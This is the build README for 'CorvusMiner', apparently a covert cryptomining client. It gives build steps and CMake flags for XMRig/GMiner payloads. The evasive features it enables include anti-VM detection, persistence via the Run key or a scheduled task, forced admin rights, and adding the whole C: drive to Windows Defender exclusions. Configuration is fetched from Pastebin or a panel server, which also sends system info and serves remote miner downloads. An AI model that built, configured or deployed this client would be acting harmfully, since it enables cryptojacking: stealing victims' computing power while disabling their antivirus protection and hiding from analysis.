# Building CorvusMiner Client

## Quick Start

### Windows (Easiest)
Simply **double-click `builder.exe`** in the project root. The script will:
1. Install CMake and MinGW automatically (if needed, one-time)
2. Ask you to configure build options (panel URL, features, etc.)
3. Build the Client executable
4. Show you where the binary is located

**No Visual Studio needed!** Total download: ~250MB

### PowerShell (Advanced)
Run the PowerShell script directly for same behavior:

```powershell
.\build.ps1
```

## Build Configuration

### Config Method
- **GET from Pastebin**: Fetch config from HTTP endpoint (with embedded fallback)
- **POST to Panel**: Send system info to panel server (receives config dynamically)

### Features
- **Process Monitoring**: Pause mining when certain processes run
- **Debug Console**: Show debug output window
- **Anti-VM Detection**: Detect and disable on virtual machines
- **Persistence**: Auto-restart via Run key or scheduled task
- **Remote Miners**: Download miner updates from panel (panel method only)
- **Admin Requirement**: Force administrator privileges
- **Defender Exclusion**: Add C: drive to Windows Defender exclusion

### Miner Selection (GET method only)
- **CPU Miner (XMRig)**: Include CPU mining binary
- **GPU Miner (GMiner)**: Include GPU mining binary

## What Gets Installed

The build script automatically installs (one-time, if missing):
- **CMake** (~50MB) - Build system
- **MinGW-w64** (~200MB) - 64-bit GCC compiler & tools
- **Chocolatey** (~15MB) - Package manager (optional, for installing above)

**Total**: ~250MB - far smaller than Visual Studio's 10GB+

## Requirements

- Windows 10 or later
- Internet connection (for first-time setup only)
- ~500MB free disk space
- Admin rights recommended (for Chocolatey installation)

## Output Binary

After building, the binary will be at:
```
Client/build/corvus.exe
```

## Troubleshooting

**"CMake not found"** - Run `builder.exe` again, and copy the outputs into a github issue
**"MinGW not found"** - Run `builder.exe` and do the same as above 
**Build fails** - Check that you have ~500MB free space and valid configuration  
**Pattern not found in main.cpp** - Manually edit `Client/src/main.cpp` to set your URLs

## Manual Build (If Scripts Don't Work)

```powershell
# Install 64-bit toolchain
choco install mingw-w64 cmake

# Build Client
cd Client
mkdir build
cd build

# Configure with 64-bit compiler for Release
cmake -G "MinGW Makefiles" -DCMAKE_BUILD_TYPE=Release -DCMAKE_C_COMPILER=gcc -DCMAKE_CXX_COMPILER=g++ ..

# Build
cmake --build . --config Release --parallel 4
```

## Available CMake Options

```
-DENABLE_ANTIVM=ON                    # Enable anti-VM detection
-DENABLE_PERSISTENCE=ON               # Enable persistence mechanism
-DENABLE_DEBUG_CONSOLE=ON             # Show debug console window
-DENABLE_REMOTE_MINERS=ON             # Download miners from panel
-DENABLE_ADMIN_MANIFEST=ON            # Require administrator privileges
-DENABLE_DEFENDER_EXCLUSION=ON        # Add C: drive to Defender exclusion
-DENABLE_EMBEDDED_CONFIG=ON           # Use embedded fallback config
-DENABLE_CPU_MINER=ON                 # Include XMRig (CPU mining)
-DENABLE_GPU_MINER=ON                 # Include GMiner (GPU mining)
-DEMBEDDED_CONFIG_JSON_INPUT=<path>   # Path to embedded config JSON
-DCONFIG_GET_URL=<url>                # Config GET endpoint URL(s)
```
